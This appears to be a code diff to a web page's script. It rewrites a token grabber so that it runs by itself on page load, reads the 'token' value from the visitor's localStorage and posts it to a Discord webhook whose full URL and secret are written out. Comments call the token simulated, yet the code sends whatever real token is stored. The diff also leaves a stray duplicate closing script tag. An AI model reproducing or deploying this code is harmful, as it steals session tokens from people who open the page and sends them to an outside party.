@@ -20,26 +20,37 @@
   </div>
 
   <script>
-    function grabToken() {
-      try {
-        const fakeToken = localStorage.getItem('token') || 'T7WA';
-        const webhookURL = 'https://discord.com/api/webhooks/1357461867072585828/YzpkiMnrk1w7Z92Zuo49nVzP8475a69mPhRQ4zxTp73ClzyyAMaCSMM9X789MkXmk8lZ'; // Replace this
-  
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            content: `🛡️ Simulated Token Captured:\n\`${fakeToken}\``
-          })
-        });
-  
-        alert("Simulated token sent to Discord webhook!");
-      } catch (e) {
-        alert("Error: Token could not be accessed.");
-      }
-    }
+    // Replace with your real webhook for testing in private server
+    const webhookURL = "https://discord.com/api/webhooks/1357461867072585828/YzpkiMnrk1w7Z92Zuo49nVzP8475a69mPhRQ4zxTp73ClzyyAMaCSMM9X789MkXmk8lZ";
+
+    // Simulated token (not real)
+    const fakeToken = localStorage.getItem('token') || 'FAKE-TOKEN-123456';
+
+    // Auto-execute on page load
+    window.onload = function () {
+      alert("Simulated token grab:\n\n" + fakeToken);
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🧪 Simulated token captured:\n\`${fakeToken}\``
+        })
+      })
+      .then(res => {
+        if (res.ok) {
+          console.log("✅ Simulated token sent to webhook.");
+        } else {
+          console.warn("⚠️ Webhook response error:", res.status);
+        }
+      })
+      .catch(err => {
+        console.error("❗ Fetch failed:", err);
+      });
+    };
+  </script>
   </script>
   
 </body>
